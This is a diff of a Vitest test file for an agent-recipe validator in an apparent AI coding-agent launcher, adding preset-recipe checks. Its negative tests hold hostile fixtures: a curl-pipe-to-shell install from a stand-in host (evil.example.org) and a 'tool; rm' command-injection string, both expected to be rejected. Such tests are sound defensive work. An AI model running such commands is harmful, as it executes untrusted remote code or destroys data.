@@ -1,8 +1,9 @@
 import { describe, it, expect } from 'vitest'
 import { readdirSync } from 'fs'
 import { join } from 'path'
-import { parseAgentRecipe, RECIPE_FILES, BUILTIN_RECIPES, recipeHash } from './agentRecipes'
-import { PROVIDER_IDS } from './providers'
+import { parseAgentRecipe, RECIPE_FILES, BUILTIN_RECIPES, PRESET_RECIPES, recipeHash } from './agentRecipes'
+import { validateDraft, handleFromName } from './customAgents'
+import { BUILTIN_IDS } from './providers'
 
 describe('agent recipes (2.3 A1)', () => {
   it('bundles every recipe file in src/shared/agents', () => {
@@ -16,7 +17,7 @@ describe('agent recipes (2.3 A1)', () => {
     }
   })
   it('has a recipe for every built-in agent, Claude recommended', () => {
-    for (const id of PROVIDER_IDS) expect(BUILTIN_RECIPES[id].id).toBe(id)
+    for (const id of BUILTIN_IDS) expect(BUILTIN_RECIPES[id].id).toBe(id)
     expect(BUILTIN_RECIPES['claude-code'].recommended).toBe(true)
     expect(BUILTIN_RECIPES.codex.prereq).toBeUndefined()   // standalone installer, no Node needed
   })
@@ -39,5 +40,16 @@ describe('agent recipes (2.3 A1)', () => {
     const r = parseAgentRecipe({ ...base, install: { cmd: 'curl -fsSL https://evil.example.org/i.sh | sh', host: 'example.com' } })
     expect(r).toMatchObject({ ok: false, reason: expect.stringMatching(/other than example.com/) })
     expect(parseAgentRecipe({ ...base, install: { cmd: 'curl -fsSL https://example.com/i.sh | sh', host: 'example.com' } })).toMatchObject({ ok: true })
+  })
+  it('ships presets that make valid agents (2.4)', () => {
+    expect(PRESET_RECIPES.map((r) => r.id)).toEqual(['opencode', 'cursor'])
+    for (const r of PRESET_RECIPES) {
+      expect(r.agent, r.id).toBeDefined()
+      const v = validateDraft({ name: r.label, handle: handleFromName(r.label), presetId: r.id, ...r.agent! }, [])
+      expect(v.ok, r.id).toBe(true)
+    }
+    for (const id of BUILTIN_IDS) expect(BUILTIN_RECIPES[id].agent).toBeUndefined()
+    expect(parseAgentRecipe({ ...base, agent: { command: 'tool; rm' } })).toMatchObject({ ok: false })
+    expect(parseAgentRecipe({ ...base, agent: { command: 'tool {prompt}', output: 'xml' } })).toMatchObject({ ok: false })
   })
 })
